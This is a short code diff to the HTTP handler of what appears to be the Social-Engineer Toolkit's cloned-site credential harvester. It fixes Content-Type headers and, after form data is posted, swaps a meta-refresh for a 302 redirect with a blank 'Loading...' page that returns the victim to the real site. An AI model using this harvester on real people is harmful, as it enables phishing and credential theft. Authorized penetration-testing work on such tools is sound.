@@ -322,7 +322,7 @@ class SETHandler(BaseHTTPRequestHandler):
 
             if self.path == "/":
                 self.send_response(200)
-                self.send_header('Content_type', 'text/html')
+                self.send_header('Content-Type', 'text/html')
                 self.end_headers()
                 fileopen = open(userconfigpath + "web_clone/index.html", "r")
                 for line in fileopen:
@@ -335,7 +335,7 @@ class SETHandler(BaseHTTPRequestHandler):
             # used for index2
             elif self.path == "/index2.html":
                 self.send_response(200)
-                self.send_header('Content_type', 'text/html')
+                self.send_header('Content-Type', 'text/html')
                 self.end_headers()
                 fileopen = open(userconfigpath + "web_clone/index2.html", "r")
                 for line in fileopen:
@@ -354,7 +354,7 @@ class SETHandler(BaseHTTPRequestHandler):
                     fileopen = open(requested_file, "rb")
                     fs = os.fstat(fileopen.fileno())
                     self.send_response(200)
-                    self.send_header("Content-type", ctype)
+                    self.send_header("Content-Type", ctype)
                     self.send_header("Content-Length", str(fs[6]))
                     self.end_headers()
 
@@ -449,8 +449,11 @@ class SETHandler(BaseHTTPRequestHandler):
             counter = 1
 
         # when done posting send them back to the original site
-        redirect = ('<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL)).encode('utf-8')
-        self.wfile.write(redirect)
+        self.send_response(302, 'Found')
+        self.send_header('Location', RAW_URL)
+        self.end_headers()
+        html = ('<!doctype html><html><head><meta http-equiv="refresh" content="0; url=%s"><title>Loading...</title></head><body></body></html>' % (RAW_URL)).encode('utf-8')
+        self.wfile.write(html)
 
         # set it back to our homepage
         os.chdir(userconfigpath + "web_clone/")
